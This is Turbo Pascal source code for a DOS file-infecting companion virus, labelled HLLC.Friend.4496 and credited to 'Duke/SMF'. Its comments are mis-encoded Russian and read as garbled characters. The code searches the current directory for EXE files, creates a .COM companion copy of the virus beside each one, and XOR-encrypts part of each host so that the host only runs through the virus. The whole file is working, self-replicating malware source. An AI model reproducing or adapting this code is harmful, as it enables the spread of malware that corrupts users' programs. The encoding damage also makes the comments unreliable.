   {
     *¥à¥¤ ¢ ¬¨ ¯à®áâ¥ìª¨© ¢¨àãá HLLC.Friend.4496 ¨«¨ Friend-4.
     *â® ä ©«®¢ë© ª®¬¯ ì® ¢¨àãá, ¯®à ¦ îé¨© EXE-ä ©«ë ¢ â¥ªãé¥¬ ª â «®£¥.
     ’¥«® ¦¥àâ¢ë ç áâ¨ç® è¨äàã¥âáï.
   -----------------------------------------------------------------------------}
   {$M 10000, 3000, 10000}
   {$I-,S-}
   uses dos;
   const virsize=4496;                         {¤«¨  ¢¨àãá }
         e='.EXE';                       {à áè¨à¥¨¥ (®¡ï§ïâ¥«ì® § £« ¢ë¬¨)}
   var  ds:dirstr;
        ns:namestr;
        es:extstr;
        g:file;
        mas:array[1..virsize] of char;         {â¥«® ¢¨àãá }
        st:string;
        par:string;                            {¯ à ¬¥âàë ª®¬ ¤®© áâà®ª¨}
        i:integer;
        ch:byte;
   {----------------------------------------------------------------------------}
   procedure Crypt(n:string);
   const CS=2000;
   var c:file;                                 {è¨äàã¥¬ë© ä ©«}
       attr:word;                              { âà¨¡ãâë ä ©« }
       t:array[1..CS] of byte;                 {è¨äàã¥¬ë© ¬ áá¨¢}
   begin
   assign(c,n);
   getfattr(c,attr);                           {á®åà ï¥¬  âà¨¡ãâë}
   setfattr(c,$20);
   reset(c,1);

   seek(c,200);                                {¯à¨ª« ¤ë¢ ¥¬ £¥à®¨ç¥áª¨¥ ãá¨«¨ï}
   blockread(c,ch,1);                          { ¤«ï ¢ëç¨á«¥¨ï  ç «ì®© }
   for i:=1 to 10 do                           { ¯®§¨æ¨¨ è¨äà®¢ ¨ï ¦¥àâ¢ë}
     begin
     seek(c,ch+1);
     blockread(c,ch,1);
     end;
   seek(c,ch+300);

   blockread(c,t,CS);                          {ç¨â ¥¬ ªãá®ª ¨§ á¥à¥¤¨ë}
   for i:=1 to CS do t[i]:=t[i] xor 99;        {è¨äàã¥¬ íâ®â ªãá®ª}
   seek(c,ch+300);
   blockwrite(c,t,CS);                         {§ ¯¨áë¢ ¥¬ ªãá®ª}
   close(c);
   setfattr(c,attr);                           {¢®§¢à é ¥¬  âà¨¡ãâë}

   end;
   {----------------------------------------------------------------------------}
   procedure Zar(n:string);                    {¯à®æ¥¤ãà  § à ¦¥¨ï}
   begin
   fsplit(n,ds,ns,es);
   st:=ds+ns+'.COM';
   assign(g,st);{$I-}reset(g,1);{$I+}          {*à®¢¥àï¥¬, ¥áâì «¨ ã¦¥ ä ©«}
                                               {á à áè¨à¥¨¥¬ COM}
   if ioresult<>0 then                         {…á«¨ ¥â => ¥éñ ¥ § à ¦¥...}
     begin
     rewrite(g,1);                             {... á®§¤ ¥¬ ª®¬¯ ì®}
     blockwrite(g,mas,virsize);                {... ¯¨è¥¬ ¢¨àãá}
     Crypt(n);                                 {è¨äàã¥¬ ¦¥àâ¢ã}
     end;
   close(g);
   end;
   {-----------------------------------------------------------------------------}
   procedure Find;                             {¯®¨áª ¯®â¥æ¨ «ìëå ¦¥àâ¢}
   var s:searchrec;
       f:file;
   begin
   {filemode:=0;}
   assign(f,paramstr(0));
   reset(f,1);
   blockread(f,mas,virsize);                   {áç¨âë¢ ¥¬ ¢¨àãá ¢ ¯ ¬ïâì}
   close(f);
   findfirst('*'+e,$21,s);                     {¨é¥¬ ¦¥àâ¢ë...}
   while doserror=0 do
     begin                                     {¥á«¨ ¤«¨  ä ©«  ¡®«¥¥ 3000,}
     if s.size>3000 then zar(s.name);          { â® ¢ë§ë¢ ¥¬ § à ¦¥¨¥}
     findnext(s);                              {á®¢  ¨é¥¬...}
     end;
   end;
   {-----------------------------------------------------------------------------}
   begin
   asm
     jmp @1
     db  '[Friend-4, Duke/SMF]'
     @1:
   end;
   fsplit(paramstr(0),ds,ns,es);
   if es=e then Find          {¥á«¨ ¬ë ¢ exe-ä ©«¥,â® ¯¥à¥å®¤¨¬ ª § à ¦¥¨î}
   else
     begin
     st:=ds+ns+e;
     assign(g,st);{$I-}reset(g);{$I+}
     if ioresult<>0 then Find {¥á«¨ ¥  ©¤¥ ¯®à ¦¥ë© ä ©«,â® § à ¦ ¥¬ ¢á¥å}
     else
       begin
       close(g);
       par:='';
       for i:=1 to paramcount do
         par:=par+' '+paramstr(i);
       Crypt(st);                              {à áè¨äà®¢ë¢ ¥¬ ¦¥àâ¢ã}
       exec(st,par);                           {§ ¯ãáª ¥¬ ¦¥àâ¢ã}
       Crypt(st);                              {§ è¨äà®¢ë¢ ¥¬ ®¡à â® :)}
       end
     end
   end.
